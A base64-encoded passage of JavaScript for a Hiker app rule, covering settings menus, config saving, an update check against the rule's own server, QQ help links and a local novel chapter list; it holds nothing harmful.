3V0LnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIuiuvue9rum7mOiupOWwgemdolxcXFxcXFwiLFxcXFxuICAgIGRlc2M6IENvbmZpZy5kZWZfUGljLFxcXFxuICAgIHVybDogXFxcXFxcXCJoaWtlcjovL3BhZ2UvU2V0dGluZy9Nb3JlLnZpZXcjbm9SZWZyZXNoIyNub1JlY29yZEhpc3RvcnkjI25vSGlzdG9yeSM/c2V0dGluZ1R5cGU9ZGVmYXVsdFBpY1xcXFxcXFwiLFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMVxcXFxcXFwiLFxcXFxuICAgIGV4dHJhOiB7XFxcXG4gICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZVxcXFxuICAgIH1cXFxcbn0pO1xcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcImxpbmVfYmxhbmtcXFxcXFxcIlxcXFxufSk7XFxcXG5sYXlvdXQucHVzaCh7XFxcXG4gICAgdGl0bGU6IFxcXFxcXFwiPHN0cm9uZz7kuIvovb3lmajorr7nva48L3N0cm9uZz5cXFxcXFxcIi5iaWcoKSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJyaWNoX3RleHRcXFxcXFxcIlxcXFxufSk7XFxcXG5sYXlvdXQucHVzaCh7XFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwibGluZVxcXFxcXFwiXFxcXG59KTtcXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lXFxcXFxcXCJcXFxcbn0pO1xcXFxuXFxcXG5mdW5jdGlvbiBzZXROdW0oa2V5LCB0ZXN0KSB7XFxcXG4gICAgbGV0IENvbmZpZyA9IEpTT04ucGFyc2UocmVhZEZpbGUoXFxcXFxcXCJjb25maWcuanNvblxcXFxcXFwiLCAwKSB8fCBcXFxcXFxcInt9XFxcXFxcXCIpO1xcXFxuICAgIGlucHV0ID0gcGFyc2VJbnQoaW5wdXQpO1xcXFxuICAgIGlmIChOdW1iZXIuaXNOYU4oaW5wdXQpKSByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+ivt+i+k+WFpeaVsOWtl1xcXFxcXFwiO1xcXFxuICAgIGlmICghdGVzdChpbnB1dCkpIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5LiN56ym5ZCI5p2h5Lu2XFxcXFxcXCI7XFxcXG4gICAgQ29uZmlnW2tleV0gPSBpbnB1dDtcXFxcbiAgICBzYXZlRmlsZShcXFxcXFxcImNvbmZpZy5qc29uXFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KENvbmZpZyksIDApO1xcXFxuICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXFxcbiAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+S/ruaUueaIkOWKn1xcXFxcXFwiO1xcXFxufVxcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcImxvZ+aVsFxcXFxcXFwiLFxcXFxuICAgIHVybDogJChDb25maWcubG9nTnVtLCBcXFxcXFxcIjA8TjwxMDBcXFxcXFxcIikuaW5wdXQoc2V0TnVtLCBcXFxcXFxcImxvZ051bVxcXFxcXFwiLCBpdCA9PiBpdCA+IDAgJiYgaXQgPCAxMDApLFxcXFxuICAgIGRlc2M6IFxcXFxcXFwiXFxcXFxcXCIgKyBDb25maWcubG9nTnVtLFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMVxcXFxcXFwiXFxcXG59KTtcXFxcblxcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIuWIhuaJueS4i+i9veaVsCgw5LiN5byA5ZCvKVxcXFxcXFwiLFxcXFxuICAgIHVybDogJChcXFxcXFxcIlxcXFxcXFwiICsgQ29uZmlnLnRocmVhZE51bSwgXFxcXFxcXCJOPi0xXFxcXFxcXCIpLmlucHV0KHNldE51bSwgXFxcXFxcXCJ0aHJlYWROdW1cXFxcXFxcIiwgaXQgPT4gaXQgPiAtMSksXFxcXG4gICAgZGVzYzogXFxcXFxcXCJcXFxcXFxcIiArIENvbmZpZy50aHJlYWROdW0sXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8xXFxcXFxcXCIsXFxcXG4gICAgZXh0cmE6IHtcXFxcbiAgICAgICAgbGluZVZpc2libGU6IGZhbHNlLFxcXFxuICAgIH1cXFxcbn0pO1xcXFxuXFxcXG5cXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lX2JsYW5rXFxcXFxcXCJcXFxcbn0pO1xcXFxuXFxcXG5sYXlvdXQucHVzaCh7XFxcXG4gICAgdGl0bGU6IFxcXFxcXFwiPHN0cm9uZz7lsI/or7TpmIXor7vlmajorr7nva48L3N0cm9uZz5cXFxcXFxcIi5iaWcoKSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJyaWNoX3RleHRcXFxcXFxcIlxcXFxufSk7XFxcXG5sYXlvdXQucHVzaCh7XFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwibGluZVxcXFxcXFwiXFxcXG59KTtcXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lXFxcXFxcXCJcXFxcbn0pO1xcXFxuXFxcXG5sYXlvdXQucHVzaCh7XFxcXG4gICAgdGl0bGU6IFxcXFxcXFwi6buY6K6k5byA5ZCv5YiG6aG16ZiF6K+7XFxcXFxcXCIsXFxcXG4gICAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKGRlZl9pc1BhZ2luYXRlKSA9PiB7XFxcXG4gICAgICAgIGxldCBDb25maWcgPSBKU09OLnBhcnNlKHJlYWRGaWxlKFxcXFxcXFwiY29uZmlnLmpzb25cXFxcXFxcIiwgMCkgfHwgXFxcXFxcXCJ7fVxcXFxcXFwiKTtcXFxcblxcXFxuICAgICAgICBDb25maWcuZGVmX2lzUGFnaW5hdGUgPSBkZWZfaXNQYWdpbmF0ZSA9PT0gXFxcXFxcXCIwXFxcXFxcXCIgPyBcXFxcXFxcIjFcXFxcXFxcIiA6IFxcXFxcXFwiMFxcXFxcXFwiO1xcXFxuXFxcXG4gICAgICAgIHNhdmVGaWxlKFxcXFxcXFwiY29uZmlnLmpzb25cXFxcXFxcIiwgSlNPTi5zdHJpbmdpZnkoQ29uZmlnKSwgMCk7XFxcXG4gICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXFxcbiAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiO1xcXFxuICAgIH0sIENvbmZpZy5kZWZfaXNQYWdpbmF0ZSksXFxcXG4gICAgZGVzYzogQ29uZmlnLmRlZl9pc1BhZ2luYXRlID09PSBcXFxcXFxcIjBcXFxcXFxcIiA/IFxcXFxcXFwi5LiN5byA5ZCvXFxcXFxcXCIgOiBcXFxcXFxcIuW8gOWQr1xcXFxcXFwiLFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMVxcXFxcXFwiXFxcXG59KTtcXFxcblxcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIuavj+mhteacgOWkp+eroOaVsFxcXFxcXFwiLFxcXFxuICAgIHVybDogJChDb25maWcudmlld1BhZ2VTaXplLCBcXFxcXFxcIjMwPE48NTAwXFxcXFxcXCIpLmlucHV0KHNldE51bSwgXFxcXFxcXCJ2aWV3UGFnZVNpemVcXFxcXFxcIiwgaXQgPT4gaXQgPiAzMCAmJiBpdCA8IDUwMCksXFxcXG4gICAgZGVzYzogXFxcXFxcXCJcXFxcXFxcIiArIENvbmZpZy52aWV3UGFnZVNpemUsXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8xXFxcXFxcXCJcXFxcbn0pO1xcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIuabv+aNouinhOWImVxcXFxcXFwiLFxcXFxuICAgIHVybDogXFxcXFxcXCJoaWtlcjovL3BhZ2UvU2V0dGluZy9Nb3JlLnZpZXcjbm9SZWNvcmRIaXN0b3J5IyNub0hpc3RvcnkjI25vUmVmcmVzaCM/c2V0dGluZ1R5cGU9cmVwbGFjZVJ1bGVcXFxcXFxcIixcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzFcXFxcXFxcIixcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2VcXFxcbiAgICB9XFxcXG59KTtcXFxcblxcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcImxpbmVfYmxhbmtcXFxcXFxcIlxcXFxufSk7XFxcXG5sYXlvdXQucHVzaCh7XFxcXG4gICAgdGl0bGU6IFxcXFxcXFwiPHN0cm9uZz7mvKvnlLvpmIXor7vlmajorr7nva48L3N0cm9uZz5cXFxcXFxcIi5iaWcoKSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJyaWNoX3RleHRcXFxcXFxcIlxcXFxufSk7XFxcXG5sYXlvdXQucHVzaCh7XFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwibGluZVxcXFxcXFwiXFxcXG59KTtcXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lXFxcXFxcXCJcXFxcbn0pO1xcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIuWFvOWuueaooeW8j1xcXFxcXFwiLFxcXFxuICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKChkZWZfaXNDb21pY0NvbXBhdGlibGUpID0+IHtcXFxcbiAgICAgICAgbGV0IENvbmZpZyA9IEpTT04ucGFyc2UocmVhZEZpbGUoXFxcXFxcXCJjb25maWcuanNvblxcXFxcXFwiLCAwKSB8fCBcXFxcXFxcInt9XFxcXFxcXCIpO1xcXFxuXFxcXG4gICAgICAgIENvbmZpZy5kZWZfaXNDb21pY0NvbXBhdGlibGUgPSBkZWZfaXNDb21pY0NvbXBhdGlibGUgPT09IFxcXFxcXFwiMFxcXFxcXFwiID8gXFxcXFxcXCIxXFxcXFxcXCIgOiBcXFxcXFxcIjBcXFxcXFxcIjtcXFxcblxcXFxuICAgICAgICBzYXZlRmlsZShcXFxcXFxcImNvbmZpZy5qc29uXFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KENvbmZpZyksIDApO1xcXFxuICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXG4gICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIjtcXFxcbiAgICB9LCBDb25maWcuZGVmX2lzQ29taWNDb21wYXRpYmxlKSxcXFxcbiAgICBkZXNjOiBDb25maWcuZGVmX2lzQ29taWNDb21wYXRpYmxlID09PSBcXFxcXFxcIjBcXFxcXFxcIiA/IFxcXFxcXFwi5LiN5byA5ZCvXFxcXFxcXCIgOiBcXFxcXFxcIuW8gOWQr1xcXFxcXFwiLFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMVxcXFxcXFwiXFxcXG59KTtcXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICB0aXRsZTogXFxcXFxcXCLmvKvnlLvliJfooajmoLflvI9cXFxcXFxcIixcXFxcbiAgICB1cmw6ICQoW1xcXFxcXFwidGV4dF8xXFxcXFxcXCIsIFxcXFxcXFwiYXZhdGFyXFxcXFxcXCIsIFxcXFxcXFwicGljXzNcXFxcXFxcIiwgXFxcXFxcXCJwaWNfM19zcXVhcmVcXFxcXFxcIiwgXFxcXFxcXCJtb3ZpZV8zX21hcnF1ZWVcXFxcXFxcIl0sIDEsIFxcXFxcXFwi6K+36YCJ5oup5ryr55S75YiX6KGo5pi+56S65qC35byPXFxcXFxcXCIpLnNlbGVjdCgoKSA9PiB7XFxcXG4gICAgICAgIGxldCBDb25maWcgPSBKU09OLnBhcnNlKHJlYWRGaWxlKFxcXFxcXFwiY29uZmlnLmpzb25cXFxcXFxcIiwgMCkgfHwgXFxcXFxcXCJ7fVxcXFxcXFwiKTtcXFxcbiAgICAgICAgQ29uZmlnLmRlZl9Db21pY19TdHlsZSA9IGlucHV0O1xcXFxuICAgICAgICBzYXZlRmlsZShcXFxcXFxcImNvbmZpZy5qc29uXFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KENvbmZpZyksIDApO1xcXFxuICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXG4gICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIjtcXFxcbiAgICB9LCBDb25maWcuZGVmX0NvbWljX1N0eWxlKSxcXFxcbiAgICBkZXNjOiBDb25maWcuZGVmX0NvbWljX1N0eWxlfHxcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMVxcXFxcXFwiXFxcXG59KTtcXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lX2JsYW5rXFxcXFxcXCJcXFxcbn0pO1xcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIjxzdHJvbmc+5YW25LuW6K6+572uPC9zdHJvbmc+XFxcXFxcXCIuYmlnKCksXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwicmljaF90ZXh0XFxcXFxcXCJcXFxcbn0pO1xcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcImxpbmVcXFxcXFxcIlxcXFxufSk7XFxcXG5sYXlvdXQucHVzaCh7XFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwibGluZVxcXFxcXFwiXFxcXG59KTtcXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICB0aXRsZTogXFxcXFxcXCLop4TliJnlj5HluIPpobVcXFxcXFxcIixcXFxcbiAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3J1bGVEZXRhaWwjbm9IaXN0b3J5IyNub1JlY29yZEhpc3RvcnkjP3J1bGU96YGT6ZW/5LuT5bqTUHJvXFxcXFxcXCIsXFxcXG4gICAgZXh0cmE6IHtcXFxcbiAgICAgICAgbHZlcjogTVlfUEFSQU1TLnZlcnNpb24gfHwgXFxcXFxcXCLojrflj5bniYjmnKzlpLHotKXvvIzoh6rooYzmn6XnnItcXFxcXFxcIixcXFxcbiAgICAgICAgaWQ6IFxcXFxcXFwiMzU1OVxcXFxcXFwiXFxcXG4gICAgfSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzFcXFxcXFxcIlxcXFxufSk7XFxcXG5cXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICB0aXRsZTogXFxcXFxcXCLmgaLlpI3pu5jorqTorr7nva5cXFxcXFxcIixcXFxcbiAgICB1cmw6ICQoXFxcXFxcXCLnoa7orqTmgaLlpI3pu5jorqTorr7nva7vvJ9cXFxcXFxcIikuY29uZmlybSgoKSA9PiB7XFxcXG4gICAgICAgIGRlbGV0ZUZpbGUoXFxcXFxcXCJjb25maWcuanNvblxcXFxcXFwiKTtcXFxcbiAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcXFxuICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+aBouWkjeWujOaIkFxcXFxcXFwiO1xcXFxuICAgIH0pLFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMVxcXFxcXFwiXFxcXG59KTtcXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICB0aXRsZTogXFxcXFxcXCLmuIXnkIbnvJPlrZhcXFxcXFxcIixcXFxcbiAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9wYWdlL1NldHRpbmcvTW9yZS52aWV3I25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5Iz9zZXR0aW5nVHlwZT1jYWNoZVxcXFxcXFwiLFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMVxcXFxcXFwiXFxcXG59KTtcXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICB0aXRsZTogXFxcXFxcXCLmlofku7bnrqHnkIZcXFxcXFxcIixcXFxcbiAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0ZpbGVNYW5hZ2VtZW50LnZpZXcjbm9SZWZyZXNoIyNub1JlY29yZEhpc3RvcnkjI25vSGlzdG9yeSNcXFxcXFxcIixcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzFcXFxcXFxcIlxcXFxufSk7XFxcXG5sZXQgdGlkID0gRGF0ZS5ub3coKTtcXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICB0aXRsZTogXFxcXFxcXCLmo4DmtYvmm7TmlrBcXFxcXFxcIixcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzFcXFxcXFxcIixcXFxcbiAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgob2xkVmVyc2lvbiwgdGlkKSA9PiB7XFxcXG4gICAgICAgIHRyeSB7XFxcXG4gICAgICAgICAgICBsZXQgbmV3VmVyc2lvbiA9IEpTT04ucGFyc2UocmVxdWVzdChcXFxcXFxcImh0dHA6Ly9oaWtlci5ub2tpYS5wcmVzcy9oaWtlcnVsZS9kZXYvZ2V0YnlpZD9pZD0zNTU5XFxcXFxcXCIsIHtcXFxcbiAgICAgICAgICAgICAgICB0aW1lb3V0OiAyMDAwXFxcXG4gICAgICAgICAgICB9KSkucmVzdWx0LnZlcjtcXFxcbiAgICAgICAgICAgIGlmIChuZXdWZXJzaW9uIDw9IG9sZFZlcnNpb24pIHtcXFxcbiAgICAgICAgICAgICAgICB1cGRhdGVJdGVtKHRpZCArIFxcXFxcXFwiI+iuvue9rl/mm7TmlrBcXFxcXFxcIiwge1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLlt7Lnu4/mmK/mnIDmlrDniYjmnKzkuoZcXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5bey57uP5piv5pyA5paw54mI5pys5LqGXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0odGlkICsgXFxcXFxcXCIj6K6+572uX+abtOaWsFxcXFxcXFwiLCB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuacieaWsOeJiOacrOi/mOacquabtOaWsFxcXFxcXFwiXFxcXG4gICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgdG9hc3QoXFxcXFxcXCLmnInmlrDniYjmnKzov5jmnKrmm7TmlrBcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwicnVsZTovLzVyVzM2WmlVNktlRzU1V003NytsYUc5dFpWOXlkV3hsWDNWeWJPKy9wV2gwZEhBNkx5OW9hV3RsY2k1dWIydHBZUzV3Y21WemN5OW9hV3RsY25Wc1pTOXlkV3hsYkdsemRDNXFjMjl1UDJsa1BUTTFOVGs9XFxcXFxcXCI7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgICAgIHVwZGF0ZUl0ZW0odGlkICsgXFxcXFxcXCIj6K6+572uX+abtOaWsFxcXFxcXFwiLCB7XFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi5L+h5oGv6I635Y+W5aSx6LSlXFxcXFxcXCJcXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/mm7TmlrDkv6Hmga/ojrflj5blpLHotKVcXFxcXFxcIjtcXFxcbiAgICAgICAgfVxcXFxuICAgIH0sIE1ZX1BBUkFNUy52ZXJzaW9uLCB0aWQpLFxcXFxuICAgIGV4dHJhOiB7XFxcXG4gICAgICAgIGlkOiB0aWQgKyBcXFxcXFxcIiPorr7nva5f5pu05pawXFxcXFxcXCJcXFxcbiAgICB9XFxcXG59KTtcXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICB0aXRsZTogXFxcXFxcXCLlhbPkuo7lpoLkvZXosIPnlKhcXFxcXFxcIixcXFxcbiAgICB1cmw6IFxcXFxcXFwibXFxYXBpOi8vZm9yd2FyZC91cmw/c3JjX3R5cGU9d2ViJnN0eWxlPWRlZmF1bHQmcGxnX2F1dGg9MSZ2ZXJzaW9uPTEmdXJsX3ByZWZpeD1hSFIwY0hNNkx5OXhkVzR1Y1hFdVkyOXRMM0Z4ZDJWaUwzRjFibkJ5Ynk5emFHRnlaVDlmZDNZOU15WmZkM2QyUFRFeU9DWnBiblpwZEdWRGIyUmxQVEZJUm5sQ1NpWm1jbTl0UFRJME5qWXhNQ1ppYVhvOWEyRWpMMjkxZEE9PVxcXFxcXFwiLFxcXFxuICAgIGRlc2M6IFxcXFxcXFwi6K+m57uG54K55Ye75Yqg5YWl6aKR6YGTKOW/q+adpeWNjuWxseS4juaIkeiuultqaV3liZEpXFxcXFxcXCIsXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8xXFxcXFxcXCJcXFxcbn0pO1xcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIumXrumimOWPjemmiFxcXFxcXFwiLFxcXFxuICAgIHVybDogXFxcXFxcXCJtcXFhcGk6Ly9mb3J3YXJkL3VybD9zcmNfdHlwZT13ZWImc3R5bGU9ZGVmYXVsdCZwbGdfYXV0aD0xJnZlcnNpb249MSZ1cmxfcHJlZml4PWFIUjBjSE02THk5eGRXNHVjWEV1WTI5dEwzRnhkMlZpTDNGMWJuQnlieTl6YUdGeVpUOWZkM1k5TXlaZmQzZDJQVEV5T0NaaGNIQkRhR0Z1Ym1Wc1BYTm9ZWEpsSm1sdWRtbDBaVU52WkdVOU1WaE9ZV3hCUlhsMlZtb21ZMjl1ZEdWdWRFbEVQV016YkVsUUptSjFjMmx1WlhOelZIbHdaVDB5Sm1aeWIyMDlNVGd4TURjMEptSnBlajFyWVNadFlXbHVVMjkxY21ObFNXUTljMmhoY21VbWMzVmlVMjkxY21ObFNXUTliM1JvWlhKekptcDFiWEJ6YjNWeVkyVTljMmh2Y25SMWNtdz0mdD0xNjcxODkzMTIzNTk3I0ludGVudDtzY2hlbWU9bXFxYXBpO3BhY2thZ2U9Y29tLnRlbmNlbnQubW9iaWxlcXE7ZW5kXFxcXFxcXCIsXFxcXG4gICAgZGVzYzogXFxcXFxcXCLnu53lr7nkuI3kvJrmnIlidWco5ZWK5oiR5LiN5o6l5Y+XISlcXFxcXFxcIixcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzFcXFxcXFxcIlxcXFxufSk7XFxcXG4vKlxcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIua4hemZpOWwj+ivtOWIhumhteiusOW9lVxcXFxcXFwiLFxcXFxuICAgIHVybDogJChcXFxcXFxcIuehruiupOa4hemZpOWwj+ivtOWIhumhteiusOW9le+8n1xcXFxcXFwiKS5jb25maXJtKCgpID0+IHtcXFxcbiAgICAgICAgZGVsZXRlRmlsZShcXFxcXFxcIm5vdmVsRm9vdHByaW50Lmpzb25cXFxcXFxcIik7XFxcXG4gICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5riF6Zmk5a6M5oiQXFxcXFxcXCI7XFxcXG4gICAgfSksXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8xXFxcXFxcXCJcXFxcbn0pO1xcXFxuKi9cXFxcbnNldFJlc3VsdChsYXlvdXQpO1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJ0ZXh0XzFcXFwiLFxcXCJuYW1lXFxcIjpcXFwiI3Yu5bCP6K+056ug6IqC5YiX6KGoXFxcIixcXFwicGF0aFxcXCI6XFxcIk5vdmVsQnJvd3Nlci52aWV3XFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxuaWYgKGdldFBhcmFtKFxcXFxcXFwiaGFzUGFyYW1zXFxcXFxcXCIpID09PSBcXFxcXFxcInRydWVcXFxcXFxcIikge1xcXFxuICAgIE1ZX1BBUkFNUyA9IHtcXFxcbiAgICAgICAgcGF0aDogZGVjb2RlVVJJQ29tcG9uZW50KGdldFBhcmFtKFxcXFxcXFwicGF0aFxcXFxcXFwiKSksXFxcXG4gICAgICAgIG5hbWU6IGRlY29kZVVSSUNvbXBvbmVudChnZXRQYXJhbShcXFxcXFxcIm5hbWVcXFxcXFxcIikpXFxcXG4gICAgfVxcXFxufVxcXFxubGV0IHBhdGggPSBNWV9QQVJBTVMucGF0aDtcXFxcbnNldFBhZ2VUaXRsZShcXFxcXFxcIk5WfFxcXFxcXFwiICsgTVlfUEFSQU1TLm5hbWUpO1xcXFxuY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzXFxcXFxcXCIpO1xcXFxuY29uc3QgVG9vbCA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9Ub29sLmpzXFxcXFxcXCIpO1xcXFxuY29uc3QgQ29uZmlnID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0NvbmZpZy5qc1xcXFxcXFwiKTtcXFxcbmNvbnN0IGJvb2tJbmZvID0gT2JqZWN0LmFzc2lnbih7XFxcXG4gICAgZm9vdDogMCxcXFxcbiAgICBpc1JlcGxhY2U6IHRydWUsXFxcXG4gICAgaXNTZWdtZW50OiB0cnVlXFxcXG59LCBKU09OLnBhcnNlKHJlcXVlc3QoXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIgKyBwYXRoICsgXFxcXFxcXCIvYm9va0luZm8uanNvblxcXFxcXFwiKSB8fCBcXFxcXFxcInt9XFxcXFxcXCIpKTtcXFxcbmxldCBpZCA9IFxcXFxcXFwiI1xcXFxcXFwiICsgbmV3IERhdGUoKS5nZXRUaW1lKCk7XFxcXG52YXIgbGF5b3V0ID0gW107XFxcXG5sZXQgbW9kZSA9IGdldE15VmFyKFxcXFxcXFwiLm1vZGVcXFxcXFxcIiwgXFxcXFxcXCIwXFxcXFxcXCIpO1xcXFxubGV0IG1vZGUyID0gZ2V0TXlWYXIoXFxcXFxcXCIubW9kZTJcXFxcXFxcIiwgQ29uZmlnLmRlZl9pc1BhZ2luYXRlKTtcXFxcblxcXFxubGV0IGlzUmV2ZXJzZSA9IGdldE15VmFyKFxcXFxcXFwiLmlzUmV2ZXJzZVxcXFxcXFwiLCBcXFxcXFxcIjBcXFxcXFxcIik7XFxcXG5hZGRMaXN0ZW5lcihcXFxcXFxcIm9uQ2xvc2VcXFxcXFxcIiwgJC50b1N0cmluZygoKSA9PiB7XFxcXG4gICAgY2xlYXJNeVZhcihcXFxcXFxcIi5tb2RlXFxcXFxcXCIpO1xcXFxuICAgIGNsZWFyTXlWYXIoXFxcXFxcXCIubW9kZTJcXFxcXFxcIik7XFxcXG4gICAgY2xlYXJNeVZhcihcXFxcXFxcIi5pc1JldmVyc2VcXFxcXFxcIik7XFxcXG4gICAgY2xlYXJNeVZhcihcXFxcXFxcIi5wYWdlTnVtXFxcXFxcXCIpO1xcXFxufSkpO1xcXFxuXFxcXG5mdW5jdGlvbiBnZXRUaXRsZSh0aXRsZSkge1xcXFxuICAgIGxldCB0aXRsZXMgPSBUb29sLnNwbGl0KHRpdGxlLCBcXFxcXFxcIiRcXFxcXFxcIiwgMik7XFxcXG4gICAgcmV0dXJuIHRpdGxlc1syXSAhPT0gdW5kZWZpbmVkID8gdGl0bGVzWzJdLnNsaWNlKDAsIHRpdGxlc1syXS5sYXN0SW5kZXhPZihcXFxcXFxcIi5cXFxcXFxcIikpIDogdGl0bGU7XFxcXG59XFxcXG5sYXlvdXQucHVzaCh7XFxcXG4gICAgdGl0bGU6IFxcXFxcXFwi5Yig6Zmk5pW05pysXFxcXFxcXCIsXFxcXG4gICAgdXJsOiAkKFxcXFxcXFwi56Gu6K6k5Yig6Zmk5pW05pys5bCP6K+077yfXFxcXFxcXCIpLmNvbmZpcm0oKHBhdGgpID0+IHtcXFxcbiAgICAgICAgY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzXFxcXFxcXCIpO1xcXFxuICAgICAgICBpZiAoRmlsZS5kZWxldGVGaWxlcyhwYXRoKSkge1xcXFxuICAgICAgICAgICAgYmFjaygpO1xcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/liKDpmaTmiJDlip9cXFxcXFxcIjtcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5Yig6Zmk5aSx6